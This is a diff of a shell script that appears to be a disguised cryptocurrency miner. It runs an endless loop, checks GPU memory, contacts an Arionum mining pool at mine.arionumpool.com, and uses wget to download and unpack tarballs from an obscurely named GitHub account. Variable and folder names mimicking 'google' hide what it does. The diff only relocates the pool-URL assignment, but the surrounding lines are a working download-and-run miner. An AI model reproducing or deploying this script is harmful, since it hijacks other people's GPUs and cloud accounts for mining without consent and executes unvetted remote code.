@@ -3,6 +3,10 @@ apt-get install -y libcpprest-dev libgmp-dev libargon2-0-dev
 while true
 do
 
+arr[0]="http://mine.arionumpool.com"
+rand=$[$RANDOM % ${#arr[@]}]
+google841212121274=${arr[$rand]}
+
 google84=$(nvidia-smi --query-gpu=memory.total --format=csv | sed 's/MiB//g' | sed 's/memory.total//g' | sed 's/\s+\n+\r+//g' | sed 's/\[//g' | sed 's/\]//g')
 
 string=$(curl -s http://mine.arionumpool.com/mine.php?q=info)
@@ -14,10 +18,6 @@ wget -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/mast
 tar -xvf ./devdeploy84.tar.gz
 
 cd googleapps8474
-
-arr[0]="http://mine.arionumpool.com"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
 
 if (($google84 >= 14884 && $google84 <= 16884));
 then
@@ -77,10 +77,6 @@ wget -N -q https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/m
 tar -xvf ./linux847412741274.tar.gz
 
 cd googleapps8474
-
-arr[0]="http://mine.arionumpool.com"
-rand=$[$RANDOM % ${#arr[@]}]
-google841212121274=${arr[$rand]}
 
 google8412=$(curl -s $google841212121274 | sed "s/\s+//g")
 
